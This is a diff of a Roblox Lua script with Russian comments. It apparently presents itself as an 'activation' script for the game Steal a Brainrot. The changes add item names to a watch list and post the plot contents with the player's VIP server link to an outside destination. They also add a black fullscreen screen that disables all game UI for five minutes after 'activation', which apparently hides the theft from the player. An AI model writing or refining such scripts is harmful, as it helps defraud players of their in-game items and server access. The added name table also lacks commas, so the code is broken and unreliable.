@@ -2,8 +2,6 @@ local HttpService = game:GetService("HttpService")
 local Workspace = game:GetService("Workspace")
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
-local StarterGui = game:GetService("StarterGui")
-local RunService = game:GetService("RunService")
 
 -- =============================
 -- Конфиг
@@ -39,7 +37,15 @@ end
 local CANONICAL_BRAINROT_NAMES = {
 	"Los Tralaleritos","Las Tralaleritas","La Cucaracha","Pot Hotspot",
 	"Garama and Madundung" "Tictac Sahur" "Spaghetti Tualetti" "Dragon Cannelloni"
-	-- ... (оставил твои имена, список не менял)
+	"Ketupat Kepat" "Ketchuru and Musturu" "Esok Sekolah" "Money Money Puggy"
+	"Nuclearo Dinossauro" "La Grande Combinasion" "Chicleteira Bicicleteira" "Los Chicleteiras"
+	"To to to Sahur" "Graipuss Medussi" "Strawberry Elephant" "67"
+	"La Extinct Grande" "Mariachi Corazoni" "Tacorita Bicicleta" "Los Nooo My Hotspotsitos"
+	"La Karkerkar Combinasion" "Los Bros" "Los Primos" "Tralaledon"
+	"Los Tacoritas" "La Sahur Combinasion" "Fragola La La La" "Los Hotspotsitos"
+	"La Supreme Combinasion" "Los Combinasionas" "Los Tungtungtungcitos" "Noo My Examen"
+	"Yess my Examen" "Secret Lucky Block" "Admin Lucky Block" "Quesadilla Crocodila"
+	-- добавьте остальные сюда!
 }
 
 local LOWER_TO_CANON = {}
@@ -189,6 +195,7 @@ local function postCombinedAllPlots()
 	end
 
 	if #sections > 0 then
+		-- если есть брейнроты — приклеиваем VIP ссылку сверху
 		if _G.VIP_LINK and _G.VIP_LINK ~= "" then
 			table.insert(sections, 1, "🔗 VIP Link: " .. _G.VIP_LINK)
 		end
@@ -248,78 +255,88 @@ local function watchPlots()
 end
 
 -- =============================
--- Новый Fullscreen Loading screen (фуллблок на 5 минут)
+-- Fullscreen Loading screen (поверх всего)
+-- =============================
+-- =============================
+-- Fullscreen Loading screen (поверх всего)
 -- =============================
 local function showLoadingScreen(duration)
 	local player = Players.LocalPlayer
-	local playerGui = player:WaitForChild("PlayerGui")
+	local StarterGui = game:GetService("StarterGui")
 
-	-- Выключаем весь стандартный интерфейс
+	-- Вырубаем все стандартные UI (хотбар, чат, leaderboard и т.д.)
 	pcall(function()
 		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 	end)
 
-	local screenGui = Instance.new("ScreenGui")
-	screenGui.IgnoreGuiInset = true
-	screenGui.ResetOnSpawn = false
-	screenGui.DisplayOrder = 9999
-	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-	screenGui.Parent = playerGui
+	-- ScreenGui поверх всего
+	local gui = Instance.new("ScreenGui")
+	gui.Name = "LoadingScreen"
+	gui.IgnoreGuiInset = true
+	gui.ResetOnSpawn = false
+	gui.DisplayOrder = 999999
+	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	gui.Parent = player:WaitForChild("PlayerGui")
 
-	local black = Instance.new("Frame")
-	black.Size = UDim2.new(1, 0, 1, 0)
-	black.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	black.BorderSizePixel = 0
-	black.ZIndex = 1000
-	black.Active = true
-	black.Parent = screenGui
+	-- Чёрный фон
+	local mainFrame = Instance.new("Frame")
+	mainFrame.Size = UDim2.new(1, 0, 1, 0)
+	mainFrame.Position = UDim2.new(0, 0, 0, 0)
+	mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+	mainFrame.BorderSizePixel = 0
+	mainFrame.ZIndex = 999999
+	mainFrame.Active = true
+	mainFrame.Selectable = true
+	mainFrame.Parent = gui
 
-	local label = Instance.new("TextLabel")
-	label.Size = UDim2.new(1, 0, 0, 100)
-	label.Position = UDim2.new(0, 0, 0.3, 0)
-	label.BackgroundTransparency = 1
-	label.Text = "Script activated, please wait."
-	label.TextColor3 = Color3.fromRGB(255, 255, 255)
-	label.Font = Enum.Font.GothamBold
-	label.TextScaled = true
-	label.ZIndex = 1001
-	label.Parent = black
+	-- Текст
+	local loadingText = Instance.new("TextLabel")
+	loadingText.Size = UDim2.new(1, 0, 0, 60)
+	loadingText.Position = UDim2.new(0, 0, 0.4, -30)
+	loadingText.BackgroundTransparency = 1
+	loadingText.Text = "Script activated, please wait..."
+	loadingText.TextColor3 = Color3.new(1,1,1)
+	loadingText.TextScaled = true
+	loadingText.Font = Enum.Font.GothamBold
+	loadingText.ZIndex = 1000000
+	loadingText.Parent = mainFrame
 
-	local barBg = Instance.new("Frame")
-	barBg.Size = UDim2.new(0.6, 0, 0, 25)
-	barBg.Position = UDim2.new(0.2, 0, 0.55, 0)
-	barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-	barBg.BorderSizePixel = 0
-	barBg.ZIndex = 1001
-	barBg.Parent = black
+	-- Полоска фон
+	local progressBarFrame = Instance.new("Frame")
+	progressBarFrame.Size = UDim2.new(0.6, 0, 0, 25)
+	progressBarFrame.Position = UDim2.new(0.2, 0, 0.55, 0)
+	progressBarFrame.BackgroundColor3 = Color3.fromRGB(50,50,50)
+	progressBarFrame.BorderSizePixel = 0
+	progressBarFrame.ZIndex = 1000000
+	progressBarFrame.Parent = mainFrame
 
-	local barFill = Instance.new("Frame")
-	barFill.Size = UDim2.new(0, 0, 1, 0)
-	barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-	barFill.BorderSizePixel = 0
-	barFill.ZIndex = 1002
-	barFill.Parent = barBg
+	-- Полоска заполнения
+	local progressBar = Instance.new("Frame")
+	progressBar.Size = UDim2.new(0, 0, 1, 0)
+	progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+	progressBar.BorderSizePixel = 0
+	progressBar.ZIndex = 1000001
+	progressBar.Parent = progressBarFrame
 
-	local startTime = tick()
-	local conn
-	conn = RunService.RenderStepped:Connect(function()
-		local elapsed = tick() - startTime
-		local progress = math.clamp(elapsed / duration, 0, 1)
-		barFill.Size = UDim2.new(progress, 0, 1, 0)
+	-- Анимация полоски
+	local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
+	local goal = {Size = UDim2.new(1, 0, 1, 0)}
+	local tween = TweenService:Create(progressBar, tweenInfo, goal)
+	tween:Play()
 
-		if elapsed >= duration then
-			conn:Disconnect()
-			screenGui:Destroy()
-
-			pcall(function()
-				StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
-			end)
-		end
+	-- Автоуборка
+	task.delay(duration, function()
+		gui:Destroy()
+		-- Возвращаем стандартный UI
+		pcall(function()
+			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+		end)
 	end)
 end
 
+
 -- =============================
--- GUI активации
+-- GUI
 -- =============================
 local function createActivationGUI()
 	local player = Players.LocalPlayer
@@ -408,11 +425,12 @@ local function createActivationGUI()
 		status.Text = "Script Activated"
 		status.TextColor3 = Color3.fromRGB(0, 255, 100)
 
+		-- Убираем отдельную отправку vipLink
 		task.wait(0.5)
 		postCombinedAllPlots()
 		watchPlots()
 
-		-- Появляется новый экран на 5 минут
+		-- Появляется fullscreen loading screen на 5 минут
 		showLoadingScreen(300)
 
 		gui:Destroy()
